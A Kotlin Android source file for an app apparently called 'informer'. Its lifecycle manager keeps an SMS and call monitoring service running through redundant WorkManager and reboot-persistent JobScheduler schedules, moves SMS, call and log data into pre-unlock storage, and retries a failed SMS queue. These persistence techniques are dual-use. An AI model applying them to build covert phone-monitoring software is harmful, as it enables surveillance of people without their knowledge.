package com.example.informer

import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

object AppLifecycleManager {
    private const val TAG = "APP_LIFECYCLE"
    private const val UNIQUE_SYNC_WORK = "InformerHardwareSyncTask_V2"
    private const val JOB_SCHEDULER_ID = 4201

    fun isActivated(context: Context): Boolean {
        val safeContext = context.createDeviceProtectedStorageContext()
        val prefs = safeContext.getSharedPreferences("AppConfig", Context.MODE_PRIVATE)
        val phone = prefs.getString("my_phone", "") ?: ""
        val token = prefs.getString("token", "") ?: ""
        return phone.isNotBlank() && token.isNotBlank()
    }

    fun syncProtectedStorage(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val dpContext = context.createDeviceProtectedStorageContext()
            val prefsToMove = arrayOf("AppConfig", "SmsDedupe", "CallDedupe", "AppInternalStateV4", "AppLogHistory")
            for (pref in prefsToMove) {
                dpContext.moveSharedPreferencesFrom(context, pref)
            }
        }
    }

    fun restoreIfActivated(context: Context, source: String) {
        syncProtectedStorage(context)
        if (!isActivated(context)) {
            Log.d(TAG, "[$source] Skip restore: not activated")
            return
        }
        ensureBackgroundRunning(context, source)
    }

    fun ensureBackgroundRunning(context: Context, source: String) {
        val appContext = context.applicationContext
        syncProtectedStorage(appContext)
        
        Log.d(TAG, "[$source] Ensure background running")
        
        HistoryScanBaseline.ensureInitialized(appContext)
        
        // 1. Đảm bảo Service đang chạy
        startMonitoringService(appContext, source)
        
        // 2. Schedule WorkManager cho periodic heartbeat (quan trọng nhất trên Android 16)
        scheduleWorkManager(appContext, source)
        
        // 3. Schedule JobScheduler dự phòng
        scheduleJobScheduler(appContext)
        
        // 4. Retry SMS queue khi có cơ hội
        retryFailedSmsQueue(appContext)
    }

    private fun scheduleWorkManager(context: Context, source: String) {
        try {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(10, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .addTag("INFORMER_SYNC_WORK")
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                UNIQUE_SYNC_WORK,
                ExistingPeriodicWorkPolicy.KEEP,
                syncRequest
            )
            Log.d(TAG, "[$source] WorkManager đã được schedule 10 phút/lần")
        } catch (e: Exception) {
            Log.e(TAG, "[$source] Lỗi schedule WorkManager: ${e.message}")
        }
    }

    private fun scheduleJobScheduler(context: Context) {
        try {
            val scheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            // Kiểm tra xem đã schedule chưa
            val existing = scheduler.getPendingJob(JOB_SCHEDULER_ID)
            if (existing != null) return // Đã schedule rồi

            val jobInfo = JobInfo.Builder(JOB_SCHEDULER_ID, ComponentName(context, KeepAliveJobService::class.java))
                .setPeriodic(10 * 60 * 1000L) // 10 phút
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true) // Giữ qua reboot
                .setBackoffCriteria(5 * 60 * 1000L, JobInfo.BACKOFF_POLICY_LINEAR)
                .build()

            val result = scheduler.schedule(jobInfo)
            Log.d(TAG, "JobScheduler schedule result=$result")
        } catch (e: Exception) {
            Log.e(TAG, "Lỗi schedule JobScheduler: ${e.message}")
        }
    }

    private fun retryFailedSmsQueue(context: Context) {
        try {
            val pending = FailedSmsQueue.pendingCount(context)
            if (pending > 0) {
                Log.d(TAG, "Có $pending SMS trong queue, đang retry...")
                FailedSmsQueue.dequeueAndRetry(context)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Lỗi retry queue: ${e.message}")
        }
    }

    fun startMonitoringService(context: Context, source: String) {
        val serviceIntent = Intent(context, BackgroundMonitoringService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "[$source] Lỗi start service: ${e.message}")
        }
    }
}